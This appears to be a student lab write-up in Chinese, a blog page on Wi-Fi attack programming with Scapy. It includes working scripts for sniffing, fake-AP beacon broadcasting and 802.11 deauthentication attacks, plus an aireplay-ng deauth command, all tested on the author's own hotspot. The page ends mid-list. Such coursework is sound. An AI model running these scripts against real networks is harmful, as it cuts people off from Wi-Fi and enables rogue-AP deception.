@@ -1,0 +1,281 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>实验五 基于 Scapy 的无线网络攻防编程实践｜MIS | MarsMrx's Blog</title><meta name="author" content="MarsMrx"><meta name="copyright" content="MarsMrx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="【大三下25年3-6月】使用 Scapy 编写无线网络攻防脚本，实践 Wi-Fi 嗅探、虚假 AP 创建以及 Deauthentication 断开攻击，并记录实验过程与关键代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验五 基于 Scapy 的无线网络攻防编程实践｜MIS">
+<meta property="og:url" content="https://marsmrx.github.io/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/index.html">
+<meta property="og:site_name" content="MarsMrx&#39;s Blog">
+<meta property="og:description" content="【大三下25年3-6月】使用 Scapy 编写无线网络攻防脚本，实践 Wi-Fi 嗅探、虚假 AP 创建以及 Deauthentication 断开攻击，并记录实验过程与关键代码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://marsmrx.github.io/img/cat-icon.png">
+<meta property="article:published_time" content="2026-10-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-23T07:33:08.977Z">
+<meta property="article:author" content="MarsMrx">
+<meta property="article:tag" content="无线网络安全">
+<meta property="article:tag" content="Scapy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://marsmrx.github.io/img/cat-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "实验五 基于 Scapy 的无线网络攻防编程实践｜MIS",
+  "url": "https://marsmrx.github.io/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/",
+  "image": "https://marsmrx.github.io/img/cat-icon.png",
+  "datePublished": "2026-10-22T16:00:00.000Z",
+  "dateModified": "2026-10-23T07:33:08.977Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "MarsMrx",
+      "url": "https://MarsMrx.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon-cat.png"><link rel="canonical" href="https://marsmrx.github.io/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '实验五 基于 Scapy 的无线网络攻防编程实践｜MIS',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.7.0/style.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/cat-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Paper/"><i class="fa-fw fas fa-file-alt"></i><span> Paper</span></a></div><div class="menus_item"><a class="site-page" href="/quote/"><i class="fa-fw fas fa-quote-left"></i><span> Quote</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/showcase/"><i class="fa-fw fas fa-laptop-code"></i><span> 演示馆</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/banner_img.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">MarsMrx's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">实验五 基于 Scapy 的无线网络攻防编程实践｜MIS</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Paper/"><i class="fa-fw fas fa-file-alt"></i><span> Paper</span></a></div><div class="menus_item"><a class="site-page" href="/quote/"><i class="fa-fw fas fa-quote-left"></i><span> Quote</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/showcase/"><i class="fa-fw fas fa-laptop-code"></i><span> 演示馆</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">实验五 基于 Scapy 的无线网络攻防编程实践｜MIS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-22T16:00:00.000Z" title="发表于 2026-10-23 00:00:00">2026-10-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-23T07:33:08.977Z" title="更新于 2026-10-23 15:33:08">2026-10-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/MIS/">MIS</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="实验5：基于-Scapy-的无线网络攻防编程实践"><a href="#实验5：基于-Scapy-的无线网络攻防编程实践" class="headerlink" title="实验5：基于 Scapy 的无线网络攻防编程实践"></a>实验5：基于 Scapy 的无线网络攻防编程实践</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
+<li>kali虚拟机  </li>
+<li>usb无线网卡</li>
+</ul>
+<h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> 实验一：使用 Scapy 进行无线网络嗅探  </li>
+<li><input checked="" disabled="" type="checkbox"> 实验二：使用 Scapy 创建虚假 AP  </li>
+<li><input checked="" disabled="" type="checkbox"> 实验三：使用 Scapy 断开设备与 WiFi 的连接</li>
+</ul>
+<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="实验一：使用-Scapy-进行无线网络嗅探"><a href="#实验一：使用-Scapy-进行无线网络嗅探" class="headerlink" title="实验一：使用 Scapy 进行无线网络嗅探"></a>实验一：使用 Scapy 进行无线网络嗅探</h3><h4 id="步骤一：使用-Scapy-查找所有-Wifi-设备"><a href="#步骤一：使用-Scapy-查找所有-Wifi-设备" class="headerlink" title="步骤一：使用 Scapy 查找所有 Wifi 设备"></a>步骤一：使用 Scapy 查找所有 Wifi 设备</h4><ul>
+<li><p>导入scapy库  </p>
+</li>
+<li><p>查找无线网卡名称  </p>
+</li>
+<li><p>IFACE_NAME为网卡描述，使用它作为接口  </p>
+</li>
+<li><p>使用<code>sniff()</code>函数进行嗅探  </p>
+<p><img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/exp1.png" alt=" "></p>
+</li>
+</ul>
+<p>运行脚本，输出结果中是WIFI的MAC地址  </p>
+<h4 id="步骤二：使用-Scapy-查找并打印所有检测到的数据包类型和地址"><a href="#步骤二：使用-Scapy-查找并打印所有检测到的数据包类型和地址" class="headerlink" title="步骤二：使用 Scapy 查找并打印所有检测到的数据包类型和地址"></a>步骤二：使用 Scapy 查找并打印所有检测到的数据包类型和地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import warnings</span><br><span class="line">from cryptography.utils import CryptographyDeprecationWarning</span><br><span class="line"><span class="comment"># 过滤掉 cryptography 的弃用警告</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=CryptographyDeprecationWarning)</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from scapy.all import *</span><br><span class="line">IFACE_NAME = <span class="string">&quot;wlan0mon&quot;</span></span><br><span class="line">devices = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">def PacketHandler(pkt):</span><br><span class="line">    <span class="keyword">if</span> pkt.haslayer(Dot11):</span><br><span class="line">        dot11_layer = pkt.getlayer(Dot11)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> dot11_layer.addr2 and (dot11_layer.addr2 not <span class="keyword">in</span> devices):</span><br><span class="line">            devices.add(dot11_layer.addr2)</span><br><span class="line">            <span class="comment"># 打印数据包的类型和发送它的MAC地址也就是AP的MAC地址</span></span><br><span class="line">            <span class="built_in">print</span>(len(devices), dot11_layer.addr2,dot11_layer.payload.name)</span><br><span class="line"></span><br><span class="line">sniff(iface=IFACE_NAME, count=100, prn=PacketHandler)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/exp1.2.png" alt=" ">  </p>
+<h3 id="实验二：使用-Scapy-创建虚假-AP"><a href="#实验二：使用-Scapy-创建虚假-AP" class="headerlink" title="实验二：使用 Scapy 创建虚假 AP"></a>实验二：使用 Scapy 创建虚假 AP</h3><h4 id="步骤一：安装并配置环境"><a href="#步骤一：安装并配置环境" class="headerlink" title="步骤一：安装并配置环境"></a>步骤一：安装并配置环境</h4><ul>
+<li><p>可选： <code>pip install scapy-fakeap</code>  </p>
+</li>
+<li><p>配置无线网卡进入监听模式</p>
+</li>
+</ul>
+<h4 id="步骤二：使用-Scapy-构建无线网络数据帧"><a href="#步骤二：使用-Scapy-构建无线网络数据帧" class="headerlink" title="步骤二：使用 Scapy 构建无线网络数据帧"></a>步骤二：使用 Scapy 构建无线网络数据帧</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个802.11帧</span></span><br><span class="line">dot11 = Dot11(<span class="built_in">type</span>=0, <span class="comment"># type=0：这表示这是⼀个管理帧。</span></span><br><span class="line">        subtype=8, <span class="comment"># subtype=8： 这将表明此管理帧是 beacon 帧。</span></span><br><span class="line">        addr1=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>， <span class="comment"># addr1：定义⽬标 MAC 地址。</span></span><br><span class="line">        addr2=sender, <span class="comment"># addr2：定义发送者的 MAC 地址。</span></span><br><span class="line">        addr3=sender) <span class="comment"># addr3：定义 AP 的 MAC 地址。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">interface = <span class="string">&quot;wlan0mon&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机获取一个发送者的MAC地址</span></span><br><span class="line">sender = RandMAC()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义AP的名称</span></span><br><span class="line">access_point_name = <span class="string">&quot;MarMrx_WiFi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义802.11帧</span></span><br><span class="line">dot11 = Dot11(<span class="built_in">type</span>=0, subtype=8,addr1=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>,addr2=sender, addr3=sender)</span><br><span class="line">beacon = Dot11Beacon()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义SSID</span></span><br><span class="line">e_SSID = Dot11Elt(ID=<span class="string">&quot;SSID&quot;</span>, info=access_point_name,len=len(access_point_name))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有层堆叠起来，并添加RadioTap层</span></span><br><span class="line">frame = RadioTap()/dot11/beacon/e_SSID</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔0.1秒发送一次</span></span><br><span class="line">sendp(frame, inter=0.1, iface=interface, loop=1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行脚本，同时开启<code>sudo airodump-ng wlan0mon</code>抓包，发现了刚才创建的虚假AP<code>MarMrx_WiFi</code>  </p>
+<p><img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/exp2_ap.png" alt=" ">  </p>
+<h3 id="实验三：使用-Scapy-断开设备与-Wi-Fi-的连接"><a href="#实验三：使用-Scapy-断开设备与-Wi-Fi-的连接" class="headerlink" title="实验三：使用 Scapy 断开设备与 Wi-Fi 的连接"></a>实验三：使用 Scapy 断开设备与 Wi-Fi 的连接</h3><h4 id="场景一：攻击者未接入无线网络"><a href="#场景一：攻击者未接入无线网络" class="headerlink" title="场景一：攻击者未接入无线网络"></a>场景一：攻击者未接入无线网络</h4><blockquote>
+<p><strong>Deauthentication 攻击原理</strong>  </p>
+</blockquote>
+<p>把解除关联数据包 发送到当前与特定接入点关联的一个或者多个客户端，强制其从WIFI网络断开连接  </p>
+<blockquote>
+<p><strong>aireplay-ng 实现 Deauthentication 攻击</strong>  </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng --deauth 0 -a [ROUTER_BSSID] -c [TARGET_MAC_ADDRESS] wlan0mon</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>攻击目标</strong>：攻击者尝试执行 Deauthentication 攻击，使所有设备均无法<br>连接目标路由器</p>
+</li>
+<li><p><strong>思路</strong>：使用scapy定义deauthentication数据帧；构建帧的发送函数并设置相关参数进行攻击</p>
+<ul>
+<li>无线网络: <code>HUAWEI-MOBILE</code>  </li>
+<li>攻击者：电脑  </li>
+<li>连接到无线网络的设备：手机</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">def disconnect_user(mac_address, access_point, interface):</span><br><span class="line">    packet = RadioTap() / Dot11(addr1=mac_address,addr2=access_point,addr3=access_point)/ Dot11Deauth(reason=7)</span><br><span class="line">    sendp(packet, inter=0.01, count=500,iface=interface, verbose=1)</span><br><span class="line"></span><br><span class="line">disconnect_user(<span class="string">&quot;ca:4d:b8:60:74:f0&quot;</span>,<span class="string">&quot;82:1C:6D:AA:EC:BF&quot;</span>,<span class="string">&quot;wlan0mon&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/exp3.1.png" alt=" ">  </p>
+<p>攻击后，手机端掉线<code>HUAWEI-MOBILE</code></p>
+</li>
+</ul>
+<h4 id="场景二-攻击者与受害者均接入同一无线网络"><a href="#场景二-攻击者与受害者均接入同一无线网络" class="headerlink" title="场景二:攻击者与受害者均接入同一无线网络"></a>场景二:攻击者与受害者均接入同一无线网络</h4><ul>
+<li><p><strong>攻击目标</strong>：攻击者已获得受害者 <strong>IP 地址</strong>，尝试执行 Deauthentication 攻击，使受害者设备与目标路由器的连接断开。</p>
+</li>
+<li><p><strong>思路</strong>：  </p>
+<ul>
+<li>获得AP的IP地址</li>
+<li>获得AP的MAC地址</li>
+<li>基于已知的受害者IP地址获得受害者的MAC地址</li>
+<li>发起Deauthentication攻击</li>
+</ul>
+</li>
+<li><p><strong>设置</strong>：  </p>
+<ul>
+<li>使用手机热点<code>hakunamatata</code>作为AP，<code>10.78.83.18</code>，人为查看的ip地址</li>
+<li>通过<code>arp</code>请求获取AP的MAC地址</li>
+<li>已知受害者的IP地址(平板)<code>192.168.71.233</code>，通过<code>arp</code>请求获取 <code>Victim MAC</code> 地址</li>
+<li>在电脑上连接手机热点，确保攻击者和受害者处于同一个无线网络，然后进行攻击</li>
+</ul>
+<p><img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/%E7%94%B5%E8%84%91%E6%8E%A5%E5%85%A5%E5%90%8C%E4%B8%80%E4%B8%AA%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C.png" alt=" ">  </p>
+<p><img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/victim_hakuna.jpg" alt=" ">  </p>
+<p><img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/exp3.2_%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F.png" alt=" ">  </p>
+<p>运行脚本进行攻击，观察客户端，自动断开了和<code>hakunamatata</code>的连接  </p>
+<video width="640" height="480" controls preload="metadata">
+  <source src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/3.2.mp4" type="video/mp4">
+  您的浏览器不支持 HTML5 视频，请
+  <a href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/3.2.mp4">下载视频</a>
+</video>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">def main():</span><br><span class="line">    devce_ip = <span class="string">&#x27;192.168.71.233&#x27;</span></span><br><span class="line">    router_ip = getting_ip_of_access_point()</span><br><span class="line">    interface = <span class="string">&#x27;wlan0mon&#x27;</span></span><br><span class="line">    mac_address_access_point = get_mac_address(router_ip)</span><br><span class="line">    <span class="comment">#&#x27;2A:90:40:CF:98:C1&#x27;</span></span><br><span class="line">    mac_address_device = get_mac_address(devce_ip)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;IP of AP:&#123;router_ip&#125;\nIP of Device:&#123;devce_ip&#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;MAC Address of Access Point : &quot;</span>,mac_address_access_point)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;MAC Address of Device : &quot;</span>,mac_address_device)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=======================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting Deauthentication Attack on Device : &quot;</span>,mac_address_device)</span><br><span class="line">    disconnect_user(mac_address_device,mac_address_access_point,interface)</span><br><span class="line"></span><br><span class="line">def getting_ip_of_access_point():</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">return</span> <span class="string">&#x27;10.78.83.18&#x27;</span></span><br><span class="line"></span><br><span class="line">def get_mac_address(ip_address):</span><br><span class="line">    src_ip = get_if_addr(conf.iface)</span><br><span class="line">    arp = ARP(pdst=ip_address, psrc=src_ip)</span><br><span class="line">    result = sr1(arp, <span class="built_in">timeout</span>=10, verbose=1, retry=5)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">return</span> result.hwsrc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line"></span><br><span class="line">def disconnect_user(mac_address_device,mac_address_access_point,interface):</span><br><span class="line">    pkt = RadioTap()/Dot11(addr1=mac_address_device,addr2=mac_address_access_point,addr3=mac_address_access_point)/Dot11Deauth(reason=7)</span><br><span class="line"></span><br><span class="line">    sendp(pkt,inter=0.1,count=200,iface=interface,verbose=1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>奇怪的问题</strong>  </p>
+<p>  一开始，使用<code>arp</code>是获取不到AP的MAC地址的，就用<code>airodump-ng</code>抓包，然后填上去的MAC地址。后来不知道为什么<code>arp</code>请求使用<code>get_mac_address()</code>就可以获取到对应IP的MAC地址了  </p>
+<p>  <img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/exp3.2_%E6%89%BE%E4%B8%8D%E5%88%B0ap_mac%E5%9C%B0%E5%9D%80.png" alt=" ">  </p>
+<p>  <img src="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/%E6%89%8B%E5%8A%A8%E6%8A%93%E6%89%8B%E6%9C%BA%E7%83%AD%E7%82%B9%E7%9A%84ip%E5%9C%B0%E5%9D%80.png" alt=" ">  </p>
+<h2 id="问题与解决"><a href="#问题与解决" class="headerlink" title="问题与解决"></a>问题与解决</h2><ul>
+<li><p><code>vscode</code>上<code>ssh reomte</code>连接到虚拟机后，在<code>vscode</code>窗口出现对文件的修改无法保存的问题  </p>
+<ul>
+<li>解决：<code>sudo chown -R kali /home/kali/MIS/</code></li>
+</ul>
+</li>
+<li><p><code>cyrptography</code>API弃用警告  </p>
+<ul>
+<li><p><code>TripleDES</code>算法的所属模块发生了迁移，当前模块在未来会被移除  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/python3/dist-packages/scapy/layers/ipsec.py:512: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module <span class="keyword">in</span> 48.0.0.</span><br><span class="line">  cipher=algorithms.TripleDES,</span><br><span class="line">/usr/lib/python3/dist-packages/scapy/layers/ipsec.py:516: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module <span class="keyword">in</span> 48.0.0.</span><br><span class="line">  cipher=algorithms.TripleDES,</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解决方法：  </p>
+<ul>
+<li><p>忽略警告  </p>
